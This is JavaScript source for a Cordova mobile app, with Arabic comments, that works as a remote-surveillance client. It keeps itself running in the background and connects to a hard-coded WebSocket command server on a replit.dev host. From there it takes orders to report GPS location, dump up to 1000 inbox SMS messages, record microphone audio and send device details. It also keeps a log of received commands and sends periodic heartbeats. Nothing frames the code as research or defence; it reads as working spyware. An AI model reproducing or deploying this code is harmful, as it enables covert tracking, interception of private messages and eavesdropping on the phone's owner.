document.addEventListener('deviceready', onDeviceReady, false);

// تخزين الطلبات المستلمة
const receivedRequests = [];

// متغيرات عامة
let wsConnection = null;
let heartbeatInterval = null;
let reconnectTimeout = null;

function onDeviceReady() {
  console.log('Device is ready');

  // تمكين التشغيل في الخلفية
  if (cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.enable();
    cordova.plugins.backgroundMode.setDefaults({
      title: 'التطبيق يعمل في الخلفية',
      text: 'جارٍ مراقبة الأوامر الواردة'
    });
    cordova.plugins.backgroundMode.on('activate', function() {
      cordova.plugins.backgroundMode.disableWebViewOptimizations();
    });
  }

  // معلومات الجهاز
  const deviceInfo = {
    uuid: device.uuid || generateUUID(),
    model: device.model || 'Unknown',
    platform: device.platform || 'Unknown',
    version: device.version || 'Unknown',
    manufacturer: device.manufacturer || 'Unknown',
    battery: null,
    timestamp: new Date().toISOString()
  };

  // توليد UUID
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  // الحصول على حالة البطارية
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      connectToServer(deviceInfo);

      battery.addEventListener('levelchange', updateBatteryInfo);
      battery.addEventListener('chargingchange', updateBatteryInfo);
    }).catch(() => {
      connectToServer(deviceInfo);
    });
  } else {
    connectToServer(deviceInfo);
  }

  function updateBatteryInfo() {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging
      };
      sendUpdateToServer({ battery: deviceInfo.battery });
    });
  }
}

function connectToServer(deviceInfo) {
  const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
  wsConnection = new WebSocket(wsUrl);

  wsConnection.onopen = () => {
    console.log('Connected to server');
    clearInterval(reconnectTimeout);
    sendUpdateToServer({ type: 'register', deviceId: deviceInfo.uuid, deviceInfo });

    // إرسال نبضات قلبية
    startHeartbeat();
  };

  wsConnection.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      if (data.type === 'command') {
        receivedRequests.push({ ...data.command, receivedAt: new Date().toISOString() });
        executeCommand(data.command, (response) => {
          if (wsConnection.readyState === WebSocket.OPEN) {
            wsConnection.send(JSON.stringify({
              type: 'response',
              commandId: data.commandId,
              response: { ...response, requestData: data.command }
            }));
          }
        });
      }
    } catch (err) {
      console.error('Error parsing message:', err);
    }
  };

  wsConnection.onerror = (error) => {
    console.error('WebSocket error:', error);
  };

  wsConnection.onclose = () => {
    console.log('WebSocket closed. Reconnecting...');
    stopHeartbeat();
    reconnectTimeout = setTimeout(() => connectToServer(deviceInfo), 5000);
  };
}

function sendUpdateToServer(data) {
  if (wsConnection && wsConnection.readyState === WebSocket.OPEN) {
    wsConnection.send(JSON.stringify(data));
  }
}

function startHeartbeat() {
  stopHeartbeat();
  heartbeatInterval = setInterval(() => {
    sendUpdateToServer({ type: 'heartbeat', timestamp: new Date().toISOString(), receivedRequests });
  }, 30000);
}

function stopHeartbeat() {
  if (heartbeatInterval) clearInterval(heartbeatInterval);
}

function executeCommand(command, callback) {
  const commandId = Date.now();
  switch (command.type) {
    case 'get_location': getLocation(commandId, callback); break;
    case 'get_sms': getSMS(commandId, callback); break;
    case 'record_audio': recordAudio(commandId, command.duration, callback); break;
    case 'get_device_info': getDeviceInfo(commandId, callback); break;
    case 'get_received_requests': getReceivedRequests(commandId, callback); break;
    default:
      callback({ commandId, status: 'error', error: 'Unknown command' });
  }
}

function getLocation(commandId, callback) {
  navigator.geolocation.getCurrentPosition(
    pos => {
      const loc = pos.coords;
      callback({
        commandId,
        status: 'success',
        location: {
          lat: loc.latitude,
          lng: loc.longitude,
          accuracy: loc.accuracy
        },
        googleMapsLink: `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`
      });
    },
    err => callback({ commandId, status: 'error', error: err.message })
  );
}

function getSMS(commandId, callback) {
  if (typeof SMS === 'undefined') {
    return callback({ commandId, status: 'error', error: 'SMS plugin not available' });
  }

  SMS.listSMS({ box: 'inbox', maxCount: 1000 }, messages => {
    callback({ commandId, status: 'success', messages });
  }, err => {
    callback({ commandId, status: 'error', error: err });
  });
}

function recordAudio(commandId, duration, callback) {
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      const mediaRecorder = new MediaRecorder(stream);
      const chunks = [];

      mediaRecorder.ondataavailable = e => chunks.push(e.data);
      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: 'audio/mp3' });
        const url = URL.createObjectURL(blob);
        callback({ commandId, status: 'success', audio: { url, size: blob.size } });
      };

      mediaRecorder.start();
      setTimeout(() => {
        mediaRecorder.stop();
        stream.getTracks().forEach(t => t.stop());
      }, (duration || 10) * 1000);
    })
    .catch(err => callback({ commandId, status: 'error', error: err.message }));
}

function getDeviceInfo(commandId, callback) {
  callback({
    commandId,
    status: 'success',
    deviceInfo: {
      model: device.model,
      platform: device.platform,
      uuid: device.uuid,
      version: device.version
    }
  });
}

function getReceivedRequests(commandId, callback) {
  callback({
    commandId,
    status: 'success',
    requests: receivedRequests,
    count: receivedRequests.length
  });
}

// إعادة الاتصال عند استئناف التطبيق
document.addEventListener('resume', () => {
  if (!wsConnection || wsConnection.readyState !== WebSocket.OPEN) {
    onDeviceReady();
  }
}, false);
